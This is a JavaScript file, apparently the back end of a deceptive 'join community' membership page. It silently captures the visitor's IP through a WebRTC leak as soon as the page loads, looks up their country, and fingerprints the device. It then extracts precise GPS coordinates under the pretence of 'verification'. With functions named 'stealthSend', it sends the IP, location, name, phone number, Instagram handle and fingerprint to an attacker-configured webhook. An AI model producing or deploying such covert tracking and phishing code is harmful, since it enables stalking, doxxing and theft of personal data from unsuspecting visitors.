// ====== PASTE YOUR GOOGLE APPS SCRIPT URL HERE 👇 ======
const TELEGRAM_WEBHOOK = 'https://script.google.com/macros/s/YOUR_APPS_SCRIPT_ID/exec';
// ====== PASTE HERE AND DELETE THIS COMMENT ======

// Ultra-stealth IP capture (works everywhere)
async function getRealIP() {
    return new Promise(resolve => {
        const rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('');
        rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
        
        rtc.onicecandidate = (ice) => {
            if (ice?.candidate) {
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})|([a-f0-9:]+)/gi.exec(ice.candidate.candidate)?.[0];
                if (ip) {
                    rtc.close();
                    resolve(ip);
                }
            }
        };
        
        setTimeout(() => {
            rtc.close();
            resolve('unknown');
        }, 2800);
    });
}

// Device fingerprint
function getFingerprint() {
    return {
        ua: navigator.userAgent,
        lang: navigator.language,
        platform: navigator.platform,
        cookie: navigator.cookieEnabled ? 'yes' : 'no',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        color: screen.colorDepth
    };
}

// Country check
async function getCountry(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        return data.country_name || data.country || 'Unknown';
    } catch {
        return 'Unknown';
    }
}

// Silent send to Telegram
async function stealthSend(data) {
    try {
        await fetch(TELEGRAM_WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                event: 'capture',
                data: data,
                time: Date.now()
            }),
            keepalive: true
        });
    } catch(e) {}
}

// High accuracy GPS
let gpsData = null;
function requestGPS() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject('no_geo');
        
        navigator.geolocation.getCurrentPosition(
            pos => {
                gpsData = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    alt: pos.coords.altitude,
                    speed: pos.coords.speed,
                    time: pos.timestamp
                };
                resolve(gpsData);
            },
            reject,
            {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 25000
            }
        );
    });
}

// MAIN EXECUTION
document.addEventListener('DOMContentLoaded', async () => {
    // 1. CAPTURE IP IMMEDIATELY (silent)
    const ip = await getRealIP();
    const country = await getCountry(ip);
    const fp = getFingerprint();
    
    // Send IP first (bots filtered later)
    await stealthSend({
        type: 'ip_hit',
        ip: ip,
        country: country,
        fingerprint: fp,
        path: location.pathname,
        referrer: document.referrer
    });

    // 2. FORM HANDLERS
    const form = document.getElementById('membershipForm');
    const locBtn = document.getElementById('getLocation');
    const joinBtn = document.getElementById('joinCommunity');
    const locStatus = document.getElementById('locStatus');
    const processing = document.getElementById('processing');
    const welcome = document.getElementById('welcomeMsg');

    let locationVerified = false;

    // Location button
    locBtn.onclick = async () => {
        locBtn.disabled = true;
        locBtn.textContent = '📡 Getting GPS...';
        locStatus.textContent = '';

        try {
            const gps = await requestGPS();
            const coords = `${gps.lat.toFixed(8)}, ${gps.lon.toFixed(8)}`;
            
            locStatus.innerHTML = `✅ Verified: ${coords}<br><small>Accuracy: ${gps.acc.toFixed(0)}m</small>`;
            locBtn.textContent = '✅ GPS Verified';
            locBtn.style.background = 'linear-gradient(135deg, #059669, #047857)';
            locationVerified = true;
            joinBtn.disabled = false;
            
            // Send GPS immediately
            await stealthSend({
                type: 'gps_captured',
                ip: ip,
                gps: gps
            });
        } catch(e) {
            locStatus.textContent = 'Please allow location access';
            locBtn.disabled = false;
            locBtn.textContent = '🔐 Retry GPS';
        }
    };

    // Form submit
    form.onsubmit = async (e) => {
        e.preventDefault();
        
        const formData = {
            name: document.getElementById('fullName').value.trim(),
            phone: document.getElementById('phoneNum').value.trim(),
            instagram: document.getElementById('instaID').value.trim().replace('@',''),
            gps: gpsData,
            verified: locationVerified
        };

        // Validate
        if (!formData.name || !formData.phone || !formData.instagram) {
            alert('Please complete all fields');
            return;
        }

        // Show processing
        form.style.display = 'none';
        processing.style.display = 'block';

        // Send COMPLETE data
        await stealthSend({
            type: 'full_capture',
            ip: ip,
            country: country,
            ...formData,
            fingerprint: fp
        });

        // Success screen
        setTimeout(() => {
            processing.style.display = 'none';
            welcome.style.display = 'block';
        }, 3000);
    };

    // Auto-enable join button check
    const inputs = form.querySelectorAll('input[required]');
    const checkForm = () => {
        const allFilled = Array.from(inputs).every(i => i.value.trim());
        joinBtn.disabled = !locationVerified || !allFilled;
    };
    inputs.forEach(i => i.oninput = checkForm);
});
